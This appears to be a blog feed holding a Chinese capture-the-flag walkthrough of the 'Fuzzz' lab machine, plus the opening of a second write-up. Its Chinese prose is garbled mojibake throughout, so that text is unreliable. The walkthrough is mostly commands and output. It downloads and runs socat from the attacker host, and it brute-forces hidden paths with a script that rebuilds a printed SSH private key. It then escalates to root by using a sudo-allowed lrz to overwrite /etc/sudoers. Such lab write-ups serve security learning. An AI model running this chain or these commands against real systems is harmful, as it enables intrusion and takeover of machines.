‰º†‰∏Ä‰∏™socatËΩ¨ÂèëÁ´ØÂè£(ËøôÈáåÁöÑsocatÈúÄË¶ÅÈùôÊÄÅÁºñËØëÁöÑÔºåÂÆÉËøô‰∏™Èù∂Êú∫Ë≤å‰ººÊòØalpineÁöÑÔºåÊâÄ‰ª•‰Ω†Áõ¥Êé•ÊãâkaliÁöÑsocatÊòØ‰∏çË°åÁöÑÔºåËá™Â∑±ÂéªÁΩë‰∏ä‰∏ã‰∏Ä‰∏™ÔºåÊúâÁºñËØëÂ•ΩÁöÑ)

```
~ $ wget 192.168.205.128/socat
Connecting to 192.168.205.128 (192.168.205.128:80)
saving to 'socat'
socat                100% |********************************| 4724k  0:00:00 ETA
'socat' saved
~ $ chmod +x socat
~ $ ./socat TCP-LISTEN:8000,fork TCP4:127.0.0.1:80 &amp;
```

ÁúãÁúãÊúçÂä°ËΩ¨ÂèëÂá∫Êù•Ê≤°ÊúâÔºàËøô‰∏™shell‰ºöËá™Âä®Êñ≠ÂºÄÔºåÊâÄ‰ª•Â¶ÇÊûúÊñ≠ÂºÄÈáçÊñ∞ËøûÂ∞±Â•Ω‰∫ÜÔºåÂèçÊ≠£Â∞±‰º†‰∏Ä‰∏™socat‰∏äÂéªÔºâ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p8000 192.168.205.163
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 20:13 EDT
Nmap scan report for 192.168.205.163
Host is up (0.00032s latency).

PORT     STATE SERVICE
8000/tcp open  http-alt
MAC Address: 08:00:27:38:B0:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
```

ËÆøÈóÆ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl 192.168.205.163:8000          
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl 192.168.205.163:8000 -v
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET / HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 0
&lt; 
* Connection #0 to host 192.168.205.163 left intact
```

ÁõÆÂΩïÁàÜÁ†¥

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ dirsearch -u http://192.168.205.163:8000 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /mnt/hgfs/gx/x/reports/http_192.168.205.163_8000/_25-07-01_20-18-36.txt

Target: http://192.168.205.163:8000/

[20:18:36] Starting: 

Task Completed
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.163:8000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,zip,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/line                 (Status: 200) [Size: 0]
/line2                (Status: 200) [Size: 0]
/line1                (Status: 200) [Size: 0]
Progress: 35450 / 1102800 (3.21%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 36260 / 1102800 (3.29%)
===============================================================
Finished
===============================================================
```

ËøôÈáåÊàëÂÅú‰∫ÜÔºåÂõ†‰∏∫ÂÆÉÁàÜÁ†¥Âá∫Êù•ÁöÑ/lineÊúâÁÇπÂÉèÂàÜÂºÄËóè‰∏úË•ø

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl 192.168.205.163:8000/line -v
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 0
&lt; 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl 192.168.205.163:8000/line/ -v
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line/ HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 404 NOT FOUND
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 207
&lt; 
&lt;!doctype html&gt;
&lt;html lang=en&gt;
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.163:8000/line/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/b                    (Status: 200) [Size: 0]
/b3                   (Status: 200) [Size: 0]
Progress: 465323 / 1102800 (42.19%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 466276 / 1102800 (42.28%)
===============================================================
Finished
===============================================================                   
```

ÁúãÁúãÂÖ∂‰ªñÁöÑ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl -v http://192.168.205.163:8000/line1
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line1 HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 0
&lt; 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl -v http://192.168.205.163:8000/line2
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line2 HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 0
&lt; 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.163:8000/line1/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line1/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/b                    (Status: 200) [Size: 0]
/b3                   (Status: 200) [Size: 0]
Progress: 23647 / 1102800 (2.14%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 24595 / 1102800 (2.23%)
===============================================================
Finished
===============================================================
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.163:8000/line2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line2/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,zip,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/Q                    (Status: 200) [Size: 0]
Progress: 51864 / 1102800 (4.70%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 53006 / 1102800 (4.81%)
===============================================================
Finished
===============================================================
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl -v http://192.168.205.163:8000/line3                                                                                                                         
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line3 HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 0
&lt; 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl -v http://192.168.205.163:8000/line4
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line4 HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 0
&lt; 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl -v http://192.168.205.163:8000/line5
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line5 HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 0
&lt; 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl -v http://192.168.205.163:8000/line6
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line6 HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 404 NOT FOUND
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 207
&lt; 
&lt;!doctype html&gt;
&lt;html lang=en&gt;
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.163:8000/line3/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line3/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/X                    (Status: 200) [Size: 0]
Progress: 39151 / 1102800 (3.55%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 39753 / 1102800 (3.60%)
===============================================================
Finished
===============================================================
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.163:8000/line4/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line4/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/A                    (Status: 200) [Size: 0]
Progress: 28543 / 1102800 (2.59%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 28874 / 1102800 (2.62%)
===============================================================
Finished
===============================================================
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.163:8000/line5/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line5/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/5                    (Status: 200) [Size: 0]
Progress: 23689 / 1102800 (2.15%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 24483 / 1102800 (2.22%)
===============================================================
Finished
===============================================================
```

ÁúãËµ∑Êù•ÂÉèÁàÜÁ†¥Â≠óÁ¨¶ÔºåÂÖàÁàÜÁ†¥‰∏ÄË°åÁúãÁúã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ chars=({a..z} {A..Z} {0..9}); dir=''; while true; do found=false; for c in '${chars[@]}'; do testdir='$dir$c'; res=$(curl -s -o /dev/null -w '%{http_code}' 'http://192.168.205.163:8000/line1/$testdir'); [[ '$res' == '200' ]] &amp;&amp; { echo 'Found: $testdir'; dir='$testdir'; found=true; break; }; done; $found || break; done
Found: b
Found: b3
Found: b3B
Found: b3Bl
Found: b3Blb
Found: b3Blbn
Found: b3BlbnN
Found: b3BlbnNz
Found: b3BlbnNza
Found: b3BlbnNzaC
Found: b3BlbnNzaC1
Found: b3BlbnNzaC1r
Found: b3BlbnNzaC1rZ
Found: b3BlbnNzaC1rZX
Found: b3BlbnNzaC1rZXk
Found: b3BlbnNzaC1rZXkt
Found: b3BlbnNzaC1rZXktd
Found: b3BlbnNzaC1rZXktdj
Found: b3BlbnNzaC1rZXktdjE
Found: b3BlbnNzaC1rZXktdjEA
Found: b3BlbnNzaC1rZXktdjEAA
Found: b3BlbnNzaC1rZXktdjEAAA
Found: b3BlbnNzaC1rZXktdjEAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAAB
Found: b3BlbnNzaC1rZXktdjEAAAAABG
Found: b3BlbnNzaC1rZXktdjEAAAAABG5
Found: b3BlbnNzaC1rZXktdjEAAAAABG5v
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vb
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbm
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmU
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAE
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEb
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9u
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZ
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQ
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAAB
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAM
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMw
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAt
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtz
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2g
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gt
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZ
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ echo 'b3BlbnNzaC1rZXktdjE' | base64 -d 
openssh-key-v1                                                                  
```

ÊòØOpenSSHÁßÅÈí•
ÈáçÊñ∞ÂÜô‰∏Ä‰∏™ËÑöÊú¨

```
#!/bin/bash

chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/+='
dir=''

for line in {1..5}; do
  url='http://192.168.205.163:8000/line$line/'
  dir=''
  while true; do
    found=0
    for ((i=0; i&lt;${#chars}; i++)); do
      c='${chars:$i:1}'
      testdir='$dir$c'
      code=$(curl -s -o /dev/null -w '%{http_code}' '$url$testdir')
      if [ '$code' = '200' ]; then
        dir='$testdir'
        echo -n '$c'
        found=1
        break
      fi
    done
    [ $found -eq 0 ] &amp;&amp; break
  done
  echo
done
```

ËøêË°å

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ bash bp.sh
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgwAAAJDS3+5f0t/u
XwAAAAtzc2gtZWQyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgw
AAAEBCjeRitoZJIm1c4i0VD2Muw5nqgb7zC13vMaxS/la+vSucQUWuMMjqti3kaZQPEy9J
5felyfQYYF+CjURC1emDAAAACWFzYWhpQHBoaQECAwQ=
```

ÊãºÊé•‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgwAAAJDS3+5f0t/u
XwAAAAtzc2gtZWQyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgw
AAAEBCjeRitoZJIm1c4i0VD2Muw5nqgb7zC13vMaxS/la+vSucQUWuMMjqti3kaZQPEy9J
5felyfQYYF+CjURC1emDAAAACWFzYWhpQHBoaQECAwQ=
-----END OPENSSH PRIVATE KEY-----
```

ÊîπÊùÉÈôê

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ chmod 600 id_rsa
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ ssh asahi@192.168.205.163 -i id_rsa
The authenticity of host '192.168.205.163 (192.168.205.163)' can't be established.
ED25519 key fingerprint is SHA256:y+2KKHDaMy8FmNZpu0PMG4PJ+b1w5rQQScGZYvJj4L8.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:8: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.163' (ED25519) to the list of known hosts.

fuzzz:~$ id
uid=1001(asahi) gid=1001(asahi) groups=1001(asahi)
fuzzz:~$ sudo -l
Matching Defaults entries for asahi on fuzzz:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asahi:
    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'

User asahi may run the following commands on fuzzz:
    (ALL) NOPASSWD: /usr/local/bin/lrz
```

lrzÁî®‰∫éÈÄöËøá ZMODEM/YMODEM/XMODEM ÂçèËÆÆÊé•Êî∂Êñá‰ª∂

ÁÑ∂ÂêéÁúãÂ∏ÆÂä©ÊñáÊ°£

```
-C, --allow-remote-commands allow execution of remote commands (Z)
```

Ëøô‰∏™ÈÄâÈ°πÁöÑÂ≠óÈù¢ÊÑèÊÄùÂ∞±ÊòØ‚Äú**ÂÖÅËÆ∏ÊâßË°åËøúÁ®ãÂëΩ‰ª§**‚Äù„ÄÇ

ÁÑ∂ÂêéÊâíÊãâ‰∫ÜÂæà‰πÖÔºåÈÉΩÊ≤°Ë°å

Êàë‰πüÂ∞ùËØï‰∫Ü‰∏ä‰º†Êñá‰ª∂Ë¶ÜÁõñÔºå‰ΩÜÊòØÂ∫îËØ•ÊòØÊàëTabbyÊúâÈóÆÈ¢òÔºåË¶ÜÁõñ‰∏ç‰∫Ü

ÂêéÈù¢ÁúãÂà∞

```
--tcp-server            open socket, wait for connection (Z)
```

so

```
fuzzz:/etc$ sudo /usr/local/bin/lrz --tcp-server
connect with lrz --tcp-client 'fuzzz.hmv:46143'
```

kali

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat sudoers
asahi ALL=(ALL:ALL) NOPASSWD: ALL
                                         
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ sz --tcp-client 192.168.205.163:46143 -y sudoers
connecting to [192.168.205.163] &lt;46143&gt;
```

Èù∂Êú∫ÂºπÂá∫‰∫Ü

```
lrz waiting to receive.fuzzz:/etc$ sudo -l
User asahi may run the following commands on fuzzz:
    (ALL : ALL) NOPASSWD: ALL
fuzzz:/etc$ sudo su
/etc # id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/etc # cat /root/root.flag 
flag{46a0e055d5db8d82eee6e7eb3ee3ccf64be3fca2}
/etc # cat /home/asahi/user.flag 
flag{da39a3ee5e6b4b0d3255bfef95601890afd80709}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Fuzzz.html</guid><pubDate>Wed, 02 Jul 2025 01:34:51 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Leak</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Leak.html</link><description>## Èù∂Êú∫‰ø°ÊÅØ

- **IP Âú∞ÂùÄ:** `192.168.205.161`
- **ÊîªÂáªÊú∫:** `192.168.205.128`

---

## ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ‰∏éÊúçÂä°Êûö‰∏æ

È¶ñÂÖàÔºåÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£ TCP Êâ´ÊèèÔºå‰ª•Á°ÆÂÆöÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ nmap -p- 192.168.205.161                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 05:49 EDT
Nmap scan report for 192.168.205.161
Host is up (0.00019s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:86:21:F9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.39 seconds
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÔºåÁõÆÊ†áÂºÄÊîæ‰∫Ü **22 (SSH)** Âíå **80 (HTTP)** ‰∏§‰∏™Á´ØÂè£„ÄÇ

